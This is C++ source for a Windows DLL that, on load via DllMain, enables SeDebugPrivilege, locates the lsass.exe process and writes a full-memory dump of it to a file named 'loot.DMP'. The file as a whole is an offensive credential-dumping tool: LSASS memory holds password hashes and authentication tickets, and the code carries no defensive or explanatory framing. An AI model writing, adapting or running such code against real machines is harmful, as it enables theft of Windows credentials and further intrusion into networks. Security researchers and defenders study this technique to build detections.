#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <DbgHelp.h>
#include <TlHelp32.h>

const LPCWSTR dmpPath = L"loot.DMP";

// get Process ID by process name
DWORD getPID(LPCWSTR procName = L"lsass.exe") {

	// take snapshot of current process
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
	DWORD processId = NULL;

	// grab lsass.exe PID
	if (Process32First(snapshot, &entry) != TRUE) return NULL; // Check if snapshot has process information
	while (Process32Next(snapshot, &entry) == TRUE) {
		if (_wcsicmp(entry.szExeFile, procName) == 0) {  
			processId = entry.th32ProcessID;
		}
	}
    CloseHandle(snapshot);

	return processId;
}

BOOL miniDumpLoot() {
	DWORD processId = getPID();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	HANDLE hFile = CreateFile(dmpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	BOOL cDump = MiniDumpWriteDump(hProcess,processId,hFile,MiniDumpWithFullMemory,NULL,NULL,NULL);

	CloseHandle(hFile);
	CloseHandle(hProcess);

	return cDump;
}

// ref: https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
BOOL setPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    LUID luid;
    BOOL bRet=FALSE;

    if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
    {
        TOKEN_PRIVILEGES tp;

        tp.PrivilegeCount=1;
        tp.Privileges[0].Luid=luid;
        tp.Privileges[0].Attributes=(bEnablePrivilege) ? SE_PRIVILEGE_ENABLED: 0;
        //  Enable the privilege or disable all privileges.
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        {
            //  Check to see if you have proper access.
            //  You may get "ERROR_NOT_ALL_ASSIGNED".
            bRet=(GetLastError() == ERROR_SUCCESS);
        }
    }
    return bRet;
}

// set SEDEBUGPRIVILEGE in current process
BOOL setSEDebug() {
	HANDLE hProcess=GetCurrentProcess();
	HANDLE hToken;
	BOOL bRet = FALSE;

	if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		bRet = setPrivilege(hToken, SE_DEBUG_NAME, TRUE);
		CloseHandle(hToken);
	}
	else {
		return bRet;
	}
	CloseHandle(hProcess);

	return bRet;
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		setSEDebug();
		miniDumpLoot();
    case DLL_THREAD_ATTACH:
		setSEDebug();
		miniDumpLoot();
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

